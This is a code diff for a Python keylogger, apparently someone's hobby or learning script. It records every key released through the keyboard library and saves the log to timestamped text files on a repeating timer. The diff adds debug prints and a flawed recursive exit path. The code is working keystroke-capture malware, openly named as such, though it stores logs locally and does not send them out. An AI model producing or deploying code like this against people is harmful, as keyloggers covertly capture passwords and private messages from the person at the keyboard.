@@ -8,12 +8,15 @@
 import sys
 
 
+
 def keylogger(starter):
     import keyboard #for logging
     from threading import Timer
     from datetime import datetime
     SEND_REPORT_EVERY =  10
     print("Keylogger has started")
+    
+    global keylogger1
     
     class Keylogger:
         def __init__(self, interval, report_method="file"):
@@ -47,26 +50,41 @@ def keylogger(starter):
             with open(f"{self.filename}.txt", "w") as f:
                 print(self.log, file=f)
             print (f"[+] Saved {self.filename}.txt")
+            print("Done and dusted")
+            keylogger(0)
+            raise SystemExit("Exiting keylogger gracefully")
+                
             
         def report(self):
+
             if self.log:
                 self.end_dt = datetime.now()
                 self.update_filename()
                 self.report_to_file()
                 self.start_dt = datetime.now()
             self.log = ""
+            print("Whats good")
             timer = Timer(interval=self.interval, function=self.report)
             timer.daemon = True
             timer.start()
+            
 
         def start(self):
+            counter = 0
             self.start_dt = datetime.now()
             keyboard.on_release(callback=self.callback)
             self.report()
             print(f"{datetime.now()} - Started keylogger")
             keyboard.wait()
+    print("Hunky Dory")
     if starter == 1:
         starter = 0
-        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-        keylogger.start()
-    print("reached the end!")
+        print(str(starter))
+        keylogger1 = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+        keylogger1.start()
+        
+    elif starter == 0:
+        print("Lmaoooo")
+        quit()
+    
+print("What's good team")   
